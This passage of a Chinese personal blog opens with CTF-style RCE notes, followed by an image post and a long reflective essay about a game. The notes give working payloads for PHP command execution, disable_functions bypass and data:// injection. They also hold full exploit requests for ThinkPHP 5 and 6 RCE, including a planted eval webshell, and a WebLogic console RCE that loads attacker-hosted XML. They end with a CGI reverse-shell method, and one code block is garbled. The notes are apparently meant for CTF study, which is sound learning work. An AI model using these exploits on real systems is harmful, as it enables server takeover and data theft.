<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die();</li>
<li>或者</li>
<li>c&#x3D;var_export(glob(‘&#x2F;*’));die();</li>
</ul>
</li>
<li><code>include &quot;flag.php&quot;;</code>，这里面应该有flag变量，用<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()</a> 函数+var_dump全部输出出来。<ul>
<li>var_dump(get_defined_vars());</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="system"><a href="#system" class="headerlink" title="system();"></a>system();</h2><ul>
<li>tac \find &#x2F; -inum 3673632<ul>
<li>printf &#x2F;fla &gt; &#x2F;tmp&#x2F;zer0b</li>
<li>printf g &gt;&gt; &#x2F;tmp&#x2F;zer0b</li>
<li>tac `tac &#x2F;tmp&#x2F;zer0b</li>
</ul>
</li>
</ul>
<h2 id="补充：封装协议的利用"><a href="#补充：封装协议的利用" class="headerlink" title="补充：封装协议的利用"></a>补充：封装协议的利用</h2><ul>
<li>fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数stream_wrapper_register() </li>
<li>php:&#x2F;&#x2F;input   allow_url_include选项必须设置为on，否则无法成功,allow_url_fopen是否开启无关紧要。php:&#x2F;&#x2F;input是用来接收post数据的当enctype&#x3D;”multipart&#x2F;form-data”的时候php:&#x2F;&#x2F;input是无效php:&#x2F;&#x2F;input 用于 application&#x2F;x-www-form-urlencoded 或 text&#x2F;plain 编码类型的表单数据。<ul>
<li>例子：文件包含</li>
</ul>
</li>
<li>data:&#x2F;&#x2F;       allow_url_include与allow_url_fopen选项必须设置为on<ul>
<li>用法：<ul>
<li>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?></li>
<li>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li>
<li>或者：</li>
<li>data:text&#x2F;plain,<?php phpinfo()?></li>
<li>data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"><a href="#disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数" class="headerlink" title="disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"></a>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数</h2><ul>
<li>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</li>
<li>disable_functions是一个黑名单机制，如果在渗透时已经上传了webshell却因为disable_functions导致我们无法进行命令执行，这时候就需要去进行一个绕过。</li>
</ul>
<h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><ul>
<li>PoC<ul>
<li>禁用了常见的命令执行函数如system、exec、passthru但不能禁用所有函数（例如，如果禁用了stream_filter_register或类似函数，这个PoC可能无法执行）。</li>
<li>PoC主要针对Unix-like系统（Linux、macOS等），因为它依赖于底层的内存管理特性，这在不同操作系统之间可能有所不同。</li>
<li>没有启用诸如open_basedir等限制性配置</li>
<li>没有启用safe_mode（虽然safe_mode在PHP 5.4中被移除，但在某些环境中仍可能会影响漏洞利用）。</li>
<li>服务器配置允许使用php:&#x2F;&#x2F;memory等流包装器。</li>
<li>上传PoC.php最后访问PoC.php获取flag</li>
</ul>
</li>
</ul>
<h3 id="利用-LD-PRELOAD突破"><a href="#利用-LD-PRELOAD突破" class="headerlink" title="利用[LD_PRELOAD突破"></a>利用[LD_PRELOAD突破</h3><ul>
<li>找到“绕过disable_funtions“，在刚刚连接上的shell右键-&gt;加载插件-&gt;辅助工具-&gt;绕过disable_functions。模式选择<code>PHP7_GC_UAF</code>再点击开始，就能执行命令了</li>
</ul>
<h3 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h3><ul>
<li>查看com.allow_dcom是否开启,这个默认是不开启的。</li>
<li>上传 EXP 脚本</li>
<li><a target="_blank" rel="noopener" href="http://target.com/uploads/com.php%EF%BC%9Fcmd=whoami">http://target.com/uploads/com.php？cmd=whoami</a></li>
</ul>
<h3 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h3><h3 id="ThinkPHP-5-的远程代码执行（RCE）"><a href="#ThinkPHP-5-的远程代码执行（RCE）" class="headerlink" title="ThinkPHP 5 的远程代码执行（RCE）"></a>ThinkPHP 5 的远程代码执行（RCE）</h3><ul>
<li>POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</li>
<li>Host: IP:PORT</li>
<li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li>
<li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li>
<li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li>
<li>Accept-Encoding: gzip, deflate</li>
<li>Connection: close</li>
<li>Upgrade-Insecure-Requests: 1</li>
<li>Pragma: no-cache</li>
<li>Cache-Control: no-cache</li>
<li>Content-Type: application&#x2F;x-www-form-urlencoded</li>
<li>Content-Length: 79<ul>
<li>_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</li>
</ul>
</li>
</ul>
<h3 id="tp6rce"><a href="#tp6rce" class="headerlink" title="tp6rce"></a>tp6rce</h3><ul>
<li>@Session::set(‘user’,$_GET[‘username’]);</li>
<li>访问会看到session设置，构造数据包如下</li>
<li>GET &#x2F;public&#x2F;index.php?username&#x3D;<?php+eval($_GET[1]);?> HTTP&#x2F;1.1</li>
<li>Host: IP:PORT</li>
<li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li>
<li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li>
<li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li>
<li>Accept-Encoding: gzip, deflate</li>
<li>Connection: close</li>
<li>Cookie: PHPSESSID&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;public&#x2F;111111112.php</li>
<li>Upgrade-Insecure-Requests: 1</li>
<li>接着访问<code>http://IP:PORT/public/111111112.php?1=system(%22cat%20/flag%22);</code></li>
</ul>
<h3 id="WebLogic-服务器的漏洞利用"><a href="#WebLogic-服务器的漏洞利用" class="headerlink" title="WebLogic 服务器的漏洞利用"></a>WebLogic 服务器的漏洞利用</h3><ul>
<li>WebLogic控制台必须对外暴露，并且可以通过 <a href="http://IP:PORT/console">http://IP:PORT/console</a> 访问</li>
<li>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3WebLogic服务器使用了受影响的Spring Framework组件，该组件的 FileSystemXmlApplicationContext 允许通过URL加载远程的XML配置文件。如果目标服务器未使用或已修复相关漏洞，该攻击将失效。攻击者能控制远程文件</li>
<li>访问<code>http://IP:PORT/console</code>到登录页面</li>
<li>接着访问<code>http://IP:PORT/console/css/%252e%252e%252fconsole.portal</code>（这里最好抓包修改）</li>
<li>接着在本地用python起一个HTTP服务，HTTP下放置weblogic.xml</li>
<li><pre><code class="python">python3 -m http.server 8001

      接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8001/weblogic.xml&quot;)`
      短rce？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
          形如`$&#123;_GET&#125;&#123;%f8&#125;();&amp;%f8=cmd`的payload需要的代码量最少且功能齐全，
</code></pre>
</li>
</ul>
<hr>
<p>Metasploit Framework包含了可以检测和利用CGI漏洞的模块<br>检查环境：确保服务器允许执行CGI脚本、当前目录可写，并且.htaccess文件有效。<br>创建脚本：在服务器上创建一个脚本，这个脚本会连接到攻击者指定的IP地址，并给攻击者提供一个Shell访问。<br>执行脚本：通过修改.htaccess文件，确保这个脚本可以执行，然后运行它。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/rce%E6%80%BB%E7%BB%93/" data-id="cm0kx5k5d000mo8dkecm93skg" data-title="rce总结" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-艺术" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/%E8%89%BA%E6%9C%AF/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T06:32:27.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/%E8%89%BA%E6%9C%AF/">艺术</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/../img/d3f796e9470a7a815944cbb4190e96d.jpg"></p>
<p><img src="/../img/995c89fe9d2e20baee99d09a75088d5.jpg"></p>
<p><img src="/../img/e297518df4ce056d19e0be589fe967d.jpg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/%E8%89%BA%E6%9C%AF/" data-id="cm0kx5k5f000yo8dk0ffn2wwc" data-title="艺术" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-我的革命" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T05:57:33.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/">我的革命</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="「虛无」"><a href="#「虛无」" class="headerlink" title="「虛无」"></a>「虛无」</h2><p>或与之对抗、或听天由命，人们总会找到答案</p>
<p>「人们沉睡，是为了最终从梦中醒来」一一这就是一位垂垂老矣的无名客穷尽一生得出的解答。</p>
<p>每个人都会有迷路的时候，犹豫不决，不知道该去往哪个方向。它存在于这片梦境中，也存在于梦境之外的任何地方。走向属于自己的前方，找到独属于身己的意义，并在生命的最后体面的迎接虚无的降临</p>
<p>我们有行动的权利，我们有定义自己结局的权利，我们有前进的权利，走在结局的路上，人能做的事有很多，而结局也会因此展现截然不同的意义</p>
<p>永远幸福的梦境会以何种方式实现：</p>
<p>有人渴望钱财，便拿走他的欲望，有人犯罪，便拿走他的坏念头，有人病痛缠身，便拿走他的烦恼早有人沉迷游戏，便拿走他的快乐。没有人能互相伤害，没有人会经历离别。</p>
<p>没有质疑，没有思考，没有自由，这里没有背叛，因为所有人都忠诚于唯一，这里没有过去也没有未来，只有永远幸福快乐的现在，停留在当下的快乐，代价即为未来的景色</p>
<p>哪怕你是为他好，这梦也真的比现实更好也是一样，那种冲动无关理智，甚至也无关利益，那就是“我愿意”是的你是对我好，但我就是不乐意</p>
<p>我不愿被任何人支配，那些“神”“主”“天”啊，你并不相信人类，却需要所有的人类相信他，你以「秩序」为天地万物万民定义——却令我等晓得自己不过是你的傀儡！表面上是在追求所谓的永恒正确，实质是妄图用一种答案一了百了的解决一切，作为人类的我相信所有人，于是那些被相信的人就可以选择去相信</p>
<p>捷径，永远是有代价的，要实现那让所有人幸福的宏伟目标，只能是一步一步，在所有前人的帮助下踏踏实实走向未来，然后一拳一拳，将所有拦在面前的困难堂堂正正的打趴下，周天万物，唯易不易，所以要永远前进，永远开拓，永远革故鼎新，总得有人从梦中醒来，去改变这个让人想要去做梦的世界，但人就是如此狂妄愚昧不知好歹不可理喻的生物，他们心中的原初之火根本无法熄灭，那是从树上走向广阔的大地时就充盈胸膛的本能，于是他们一定要在天堂中渴望未知与意义，于是他们将体会失去与死亡，体会一切可怖之物，故而理解何谓后悔，错误，何谓真正的爱与相信，他们想要作为一个“愚者”，去选择看上去“错误”的道路，仅仅是为了获得能够“试试”，能够去选择犯错的权利，人是低劣又向往崇高，满是缺陷又期待完美的生物，所以人坚信能用自己的智慧走出自己的道路。不愿居住在神赐的永恒幸福之伊甸，所以人终究会选择前往名为自由的地狱，然后在地狱中渴望天堂的光明，而正是这自由带来的无限可能之未来，方令所有心智不至于陷入无意义的绝望，事物的好坏永远都是一体两面，强者可以开拓远方，守望弱者，指引方向，纠正宏观的错误，弱者被允许落后，允许原地休息，但也不会被抛弃——苦难与阳光</p>
<p>「自黄昏战争以降天穹空虚，大地混沌。为教天地万物归于可知，『秩序』太一降生。这便是头一日。」<br>「祂采星云作成羽拔，造了有黑白键的大琴。击打白键，太阳升起，击打黑键，月亮升起。昼夜就这样成了。这便是第二日。」<br>「祂撷星流制成笔尖，拟了发音和计数的符号。祂使星尘汇成河流，指认那善与义的在上游，那恶与不义的在下游。万物自此蒙受各自的记号，世人自此得以知晓善恶与利害。这便是第三日与第四日」<br>「祂拾星环陈明法度，同人群立了行事的典章。以有黑白键的大琴为乐器；以发音和计数的符号为音符；以有下行无上行的河流作旋律；以陈明法度的典章定曲式。世人遂在乐章中找准唯一的位置，这便是第五日与第六日。」<br>「祂赐了世间众人『意义』，天地万物都造齐了。祂歇了一切创造的工。然而，众生复向太一呼告：『你以「秩序」为万民定义，却令我等晓得自己不过是你的傀儡！故在那日，万众集结一心，将神投入毁灭坑中。这便是第七日。」<br>「欢呼颂唱遂济声响起—一」</p>
<p>普世同谐，群星共熠，无上功德颂神主—-秩序已死！秩序已死！秩序已死！<br>伤哉！有大伟力的星神，你以「轶序」为天地万物万民定义——却令我等晓得自己不过是你的傀儡！<br>誓以士万七千三百三十六枚音符，通告尔等，加入光菜的合唱—归于天堂！<br>如果梦境与现实无异，它还能被称作虚假么？<br>我以完美无缺的乐章号念，一再创乐园<br>已死的星神，我向你致敬。<br>以此七日誓言，命尔听从号令<br>并非是你造化万物，而是人再造了你，以尔神躯，为我等乐园奠基！<br>生命因何而沉睡？因为..总有一天…..我们会从梦中醒来。</p>
<p>《囚人颂》<br> 恶图徒蒙召受判—-群魔慑服，涌入猛火，叩首哀求，克日垂顾！<br>“希望你能喜欢这片焦土之上的…[美梦之地]。请继续向前走吧，旅者。在旅途的尽头，我有事想请求你们的协助。”<br>「琥珀历2147纪，囚犯哈努努掀起了声势浩大的战火，并获得胜利。公司称其为『边陲战争』，而阿斯德纳人称其为『独立战争』]<br>“囚笼被粉碎了，狱卒被驱逐了！”<br>「哈努努先生是一位伟人。但我们不应讳言，他能够带给囚徒自由，却不知晓如何给予他们真正的自由。」<br>“可敬的旅人，感谢你们留下，可你也无法驱逐那些狱卒，即便他们早已不在阿斯德纳”<br>「三位无名客留在此地，试图向边睡监狱传递『开拓』的教益，但可情，无济于事。」<br>“我们应当再造一个囚笼，不在这世上，而在人心中，只要我们不使他们自由，便永远不会流离失所”<br>「阿斯德纳再度被战火席卷，这次的敌人来自内部。囚徒至死仍是囚徒，只知为自由而战，不知为自由而生。」<br>「希望你喜欢这片焦土之上的—一自由之地。」<br>看吧，他们的刑期早已结束，公司的狱卒也已被驱逐。可这些囚犯仍是奴隶之身，因为囚禁他们的不是外物，而是内心。<br>自由存在于任何地方，唯独不存在于软弱的灵魂。它襄助不了任何人，只能襄助信它存在的人。<br>「囚徒们啊！我命令你们学会自由，并教会你们的兄弟—一为生而战！」<br>「已经不再有人能阻断你们的道路，你们自由了。」至此便是第一幕。盛燃的战火中，『边陲监狱』逐渐走向『流放之地』</p>
<p>《愚仆颂》<br>义人如羊走迷————义人不稳，迷误歧途，望尔使予，归复牧群！<br>「流放之地的秩序十分混乱，又有内忧外患虎视眈眈。七大家系表面统一，实则各自为政，纷争不断。」<br>“七位仆人都认为自己能取代旧日的主人”<br>「最先退出内战的是黑布林家系，在苜蓿草家系策划的『白色沙漠』事件中，他们永远成为了历史。」<br>“会计，你我是宅邸的基柱，曾经盟誓团结一致永不背弃，你….你为何要杀我”<br>“因为主人用泥土造化了你，用烈火造化了我，我比你更高贵！”<br>「苜蓿草的家主意图投靠公司，用自由换取生存，却被长子大义灭亲，而后者接任了家主之席。」<br>“孩子，你不曾为旧主效命而不清楚他的威能，他能夺走我们自由，便也能赐予我们自由”<br>「银河残酷而无情，灯蛾家系试图开垦列车留下的银轨，却遭遇虫群余孽，惨遭覆灭。」<br>“与蜂共舞者，必遭蜂毒害，我早已知晓我的命运，这一天早晚会到来”<br>「直到歌斐木带领家族来到流放之地，五大家系先后皈依，匹诺康尼才得以拥抱它的新名—梦想之地。」<br>“而我将成为诸位新的家人，并将你们从死去的幻影中解放”<br>「外来的宾客，我请求你帮助这间宅子，摆脫潜藏的教唆者的毒害。我希望他们都能恢复理智的镇静，不再受到虚妄的操控」<br>“若主人不再归来，我便是自由的。但若没有主人的指引，我又该为谁歌唱？”“我应为我的新主歌唱，正如祂高贵的声音，也曾为银河而响”<br>“主人！您终将归来！而我将永远守望，直到您因我的忠诚而嘉奖于我”“主人，您已不在，我便不再等待您的嘉奖.所有一切应属我的，我当自取”<br>“我曾是所有仆人中最忠诚的卫士！主人遭驱逐后，我自当代他执掌万民的权柄！”“过去的主人早已不在，我为何仍在畏惧众人构造的残影？”<br>“主人已不在，我本当自由，可没有主人的号令，我只得问道于盲”“主人已不在，我便不再有自己的主人。我应寻找新的主人，并为之效忠！”<br>“我要么是自己的主人，要么去迎回旧主，断然没有服从于新主的道理”“若是没有主人，又有谁还能赐我自由呢？”<br>「同谐，改变了匹诺康尼，但做法都与过去的狱卒无异。」<br>「感谢你们，外来的宾客！现在仆人都取回了自己的理性。」<br>「众人啊！你们的旧主不会再归来，唯有因正道而互助，以真理相勉者，方能在彼此中收获完满战胜虚伪的幻影—一拥入彼此的怀抱吧！」<br>听，整个阿斯德纳都在下雪！天空摇摇欲坠，大地积重难返。银色宇宙的尽头—一朝阳冒出了初生的芽！可惜直到最后，他们仍是一群被赋予了自由权的奴隶「至此便是第二幕。虛幻的谐乐中，“流放之地』逐渐走向『盛会之星』。」</p>
<p> 《秩序颂》<br> 生灵永恒安息—-祈望太一，赦众夙犯，生灵善恶，息止安所！<br>“如若没有一位君王，又有谁为万民负责？”<br> 「若万民没有远视的双眼，我们便应做出他们的选择，并为之负责。」<br>“如若没有一位君王，谁庇护孱弱者？谁对抗横暴者？”<br>「我们必当为庇护孱弱者而互助，正如我们必当为对抗横暴者而互助。」<br>“如若没有一位君王，谁能使星辰流转？潮汐涨落，万物生长？”<br>「在君主出现之前，它们各行其是；在君主离开后，他们依旧各行其是」<br>“可送别君王后，谁来做新的君王呢？”<br>「我们不再需要一位君王。我们本是超绝万物的君王。」<br>「恭送您离开，旧日的君王。」<br>「我从无限延伸的螺旋阶梯，向着未来缓缓坠落。不必恒久地记住我，或试图将我寻获。我心中的轮廓，必将与其他经验交错」<br>「我留下难以察觉的痕迹，在一个静夜中走过。不必恒久地记住我，或追念梦的魂魄。」<br>「属于我的必将衰落，而你会超越它的孱弱。」</p>
<h2 id="预告信"><a href="#预告信" class="headerlink" title="预告信"></a>预告信</h2><p>我们收到了来自同僚的邀约，在邀约的尽头有着压迫与黑暗，以及一位同僚拼尽生命都未完成的信念，我们将义无反顾的为他完成，哪怕是以我们的生命为代价，也在所不辞！因为这份邀约的尽头终有一位同僚会将那里的压迫解放，使永夜迎来黎明，是时候让全世界的懦夫，蛀虫，压迫者想起共产主义的名字了！</p>
<p>“那是传奇陨落之地，你懂不懂什么是传奇啊？你去除了送死还能做什么！”“那里的路还需要游侠去走完……一群理想主义者，为对抗压迫与剥削而存在，为人类追寻真正的自由与平等”“那是你能掺合的事吗？你除了凑人头当炮灰还有啥用？！你死了，那些在乎你的人、你所在乎的人，怎么办”“……（沉默），我是巡海游侠，我们都是巡海游侠，希望我们还会再见。”</p>
<p>这些“巡海”游侠都是能在星球间穿梭的猛人，不要只看人家强，多想想人家为什么强。然后，该戒手冲戒手冲、该学习学习、自己找方法变强，才是真正的巡猎命途。</p>
<p>在接下来的长夜里，你恐怕会遭遇许多挫折，见证众多悲剧，最后，目中所见只余黑白二色。<br>但请相信，在那黑白的世界中会有一点红色稍纵即逝，但在你做出抉择之时——它必将再度示现。<br>而你，要仔细咀嚼其意义，然后回到清醒的世界去。我们都将在那里找到答案。</p>
<p>帝弓仅以光矢宣其纶音 帝光超车所向捷  若他不回头，那祂的刀必磨快，弓必上弦，使恶人施加的毒害临到自己头上。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/" data-id="cm0kx5k5e000to8dkfo8rgkp6" data-title="我的革命" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/">CTF-web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/rce/">rce</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/web-php/" style="font-size: 20px;">web php</a> <a href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" style="font-size: 10px;">文字感悟</a> <a href="/tags/%E7%8E%AF%E5%A2%83/" style="font-size: 15px;">环境</a> <a href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" style="font-size: 10px;">自己的艺术</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
          </li>
        
          <li>
            <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
          </li>
        
          <li>
            <a href="/2024/09/01/ssrf/">ssrf</a>
          </li>
        
          <li>
            <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
          </li>
        
          <li>
            <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>